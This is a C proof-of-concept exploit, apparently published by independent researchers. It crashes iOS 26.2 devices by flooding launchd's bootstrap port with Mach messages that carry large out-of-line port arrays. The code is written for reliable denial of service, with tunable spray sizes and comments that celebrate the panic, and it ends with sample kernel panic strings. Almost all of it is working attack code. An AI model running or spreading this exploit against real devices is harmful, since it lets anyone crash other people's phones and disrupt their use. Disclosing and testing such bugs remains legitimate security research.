/*
 * poc.c
 * Works on iOS 26.2 (23C55); sim usually not affected.
 * Tested on: iPhone 15 Plus (26.2), iPad (18.0)
 * Original: Jian Lee (@speedyfriend433)
 * Stability tweaks for reproducible DoS: yousef (yousef_dev921)
 */

#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
//#include <mach/message.h>
//#include "bootstrap.h"
//#include <mach/task_special_ports.h>

#define DEFAULT_PORT_COUNT 2048 // larger spray by default; override with PORT_COUNT env
#define DEFAULT_MSG_COUNT 1200  // number of mach_msg sends; override with MSG_COUNT env
/// prior values (e.g. 67/478) may be too small on some devices

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    char padding[67]; // 67 was enough
} panic_msg_t;

int main(void) {
    kern_return_t kr;
    const char *port_count_env = getenv("PORT_COUNT");
    const char *msg_count_env = getenv("MSG_COUNT");
    size_t port_count = port_count_env ? strtoul(port_count_env, NULL, 0) : DEFAULT_PORT_COUNT;
    size_t msg_count = msg_count_env ? strtoul(msg_count_env, NULL, 0) : DEFAULT_MSG_COUNT;

    if (port_count == 0 || port_count > 16000) { // keep under IPC_KMSG_MAX_OOL_PORT_COUNT (~16383)
        port_count = DEFAULT_PORT_COUNT;
    }
    if (msg_count == 0) {
        msg_count = DEFAULT_MSG_COUNT;
    }

    printf("port array (%zu bytes)...\n", sizeof(mach_port_t) * port_count);
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));
    mach_port_t fake_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_port);
//    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_port);
//    mach_port_deallocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE)
    mach_port_insert_right(mach_task_self(), fake_port, fake_port, MACH_MSG_TYPE_MAKE_SEND);
    
    for (size_t i = 0; i < port_count; i++) {
        ports[i] = fake_port;
    }

    panic_msg_t msg = {0};
    
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(panic_msg_t);
    msg.header.msgh_local_port = MACH_PORT_NULL;

    mach_port_t bootstrap_port; /*
                                 com.apple.mobilecheckpoint.checkpointd
                                 com.apple.mobile.installd
                                 https://github.com/speedyfriend433/iOS-26-Reachable-Mach-Services/blob/e2e6a0c9a5221ab23ed3c43bf9d106f103952632/Reachable%20Mach%20Services.txt#L171C1-L172C26
                                 */
    kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        printf("failed to get bootstrap: 0x%x\n", kr);
        free(ports);
        return 1;
    }
    msg.header.msgh_remote_port = bootstrap_port;
    msg.header.msgh_id = 0x67676767;
    msg.body.msgh_descriptor_count = 1;
    msg.ool_ports.address = (void *)ports;
    msg.ool_ports.count = (mach_msg_type_number_t)port_count;
    msg.ool_ports.deallocate = FALSE;
    msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
//    MACH_MSG_TYPE_MAKE_SEND; O
//    MACH_MSG_TYPE_COPY_SEND; X
//    MACH_MSG_TYPE_MOVE_RECEIVE; X
//    MACH_MSG_TYPE_COPY_RECEIVE; X
//    MACH_MSG_TYPE_MOVE_SEND_ONCE; X
//    MACH_MSG_TYPE_MAKE_SEND_ONCE; X
//
    
    
    
    
    printf("good bye launchd\n");
    
    for (size_t i = 0; i < msg_count; i++) {
        kr = mach_msg(
            &msg.header,
            MACH_SEND_MSG,
            msg.header.msgh_size,
            0,
            MACH_PORT_NULL,
            MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL
        );
        
        if (kr != KERN_SUCCESS) {
            if (i % 100 == 0) printf("[-] send failed: 0x%x at %zu\n", kr, i);
        } else {
            if (i % 100 == 0) printf("."); // pretty sure device will panic after 2~3 seconds if apple didn't patch it
                                            /// i think apple will patch this in iOS 26.3 since i open sourced it
        }
    }
    
    printf("\n[*] spray done :D device panic?\n"); // won't even reach
    
    free(ports);
    return 0;
}



/*
 "panicString" : "panic(cpu 1 caller 0xfffffff02fd8edc0):  initproc exited -- exit reason namespace 1 subcode 0x7 description: none
 "panicString" : "panic(cpu 5 caller 0xfffffff0288d22e4):  initproc exited -- exit reason namespace 1 subcode 0x7 description: none
 */
